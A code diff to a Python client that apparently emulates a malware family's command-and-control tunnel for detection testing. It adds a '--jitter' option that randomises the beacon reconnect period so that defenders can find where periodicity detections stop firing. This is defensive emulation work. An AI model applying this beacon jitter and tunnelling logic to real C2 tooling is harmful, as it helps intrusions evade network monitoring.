@@ -59,6 +59,14 @@ raises, and the process exits. Only a timeout restarts it. So the cadence is
 other than 120 s. **Changing it is a deviation from the original** and the
 help text says so.
 
+`--jitter` spreads that deadline, which is the only place jitter can live: the
+reconnect period *is* the deadline, so the server cannot produce a jittered
+cadence at all. It does not choose the period -- if it closes the connection
+this process exits rather than reconnecting, and if it merely goes quiet the
+deadline here decides when. Jitter is how you walk the coefficient of
+variation upward and find where a periodicity detection stops firing, and it
+is a deviation the original does not have.
+
 ## Getting out
 
 The original dials its C2 directly and cannot cross a proxy. This adds
@@ -72,6 +80,7 @@ import argparse
 import errno
 import logging
 import os
+import random
 import select
 import socket
 import struct
@@ -352,14 +361,31 @@ class Relay(threading.Thread):
 class Tunnel(object):
     """The command connection, and the reconnect loop that gives it a cadence."""
 
-    def __init__(self, address, proxy, login, password, timeout, ledger):
+    def __init__(self, address, proxy, login, password, timeout, ledger,
+                 jitter=0.0):
         self.address = address
         self.proxy = proxy
         self.login = login
         self.password = password
         self.timeout = timeout
+        self.jitter = max(0.0, min(jitter, 0.95))
         self.ledger = ledger
         self._stop = threading.Event()
+
+    def deadline(self):
+        """How long this attempt will wait before giving up and reconnecting.
+
+        The reconnect period *is* this number, so jitter has to live here and
+        nowhere else. The server cannot produce a jittered cadence: it does
+        not choose the period at all -- if it closes the connection the
+        original exits rather than reconnecting, and if it merely goes quiet
+        the client's own deadline decides when. A jitter knob on the server
+        would have described a control it does not have.
+        """
+        if self.jitter <= 0:
+            return self.timeout
+        spread = self.timeout * self.jitter
+        return max(1.0, self.timeout + random.uniform(-spread, spread))
 
     def dial(self, port):
         """Open one connection to the server, directly or through the proxy."""
@@ -382,7 +408,9 @@ class Tunnel(object):
                 # means a new TCP connection every `timeout` seconds, and
                 # that is the cadence a proxy log shows.
                 self.ledger.record("command-timeout", attempt=attempt,
-                                   after_seconds=int(self.timeout))
+                                   after_seconds=round(
+                                       getattr(self, "_waited",
+                                               self.timeout), 2))
                 continue
             except _Closed as exc:
                 # The original exits here rather than reconnecting: it reads
@@ -406,7 +434,9 @@ class Tunnel(object):
                            via="proxy" if self.proxy else "direct")
         try:
             while not self._stop.is_set():
-                deadline = time.monotonic() + self.timeout
+                waiting = self.deadline()
+                self._waited = waiting
+                deadline = time.monotonic() + waiting
                 port = _U16_LE.unpack(_recv_exactly(sock, 2, deadline))[0]
                 if port == 0:
                     # The keep-alive, and the `00 00` a scanner sees.
@@ -449,6 +479,17 @@ def main(argv=None):
                              "A server quieter than this makes the client "
                              "reconnect, which is the cadence being "
                              "measured. CHANGING THIS IS A DEVIATION.")
+    parser.add_argument("--jitter", type=float, default=0.0,
+                        metavar="FRACTION",
+                        help="spread the read deadline by this fraction, so "
+                             "the reconnect period is uniform in "
+                             "timeout*(1+-FRACTION). 0.3 turns a flat "
+                             "120-second cadence into 84-156 seconds and a "
+                             "coefficient of variation near 0.17, which is "
+                             "how you find the jitter a periodicity "
+                             "detection stops firing at. THE ORIGINAL HAS "
+                             "NO JITTER; this is a deviation and the "
+                             "measured CV is yours, not the family's.")
     parser.add_argument("--login", default="operator",
                         help="credential offered if the server asks for one "
                              "(the original's pair is a published detection "
@@ -474,13 +515,20 @@ def main(argv=None):
         LOG.warning("timeout is %.0fs, not the original's %.0fs -- the "
                     "reconnect cadence this produces is yours, not the "
                     "family's", args.timeout, _SOCKET_TIMEOUT)
+    if args.jitter:
+        LOG.warning("jitter %.2f spreads the deadline over %.0f-%.0fs. The "
+                    "original has none, so the cadence this produces is "
+                    "yours -- use it to find a detection's threshold, and "
+                    "say in the finding that it was set.",
+                    args.jitter, args.timeout * (1 - args.jitter),
+                    args.timeout * (1 + args.jitter))
 
     ledger.record("client-start", server="%s:%d" % address,
                   proxy=("%s:%d" % proxy) if proxy else "none",
-                  timeout=int(args.timeout))
+                  timeout=int(args.timeout), jitter=args.jitter)
 
     tunnel = Tunnel(address, proxy, args.login, args.password,
-                    args.timeout, ledger)
+                    args.timeout, ledger, jitter=args.jitter)
     try:
         tunnel.run()
     except KeyboardInterrupt:
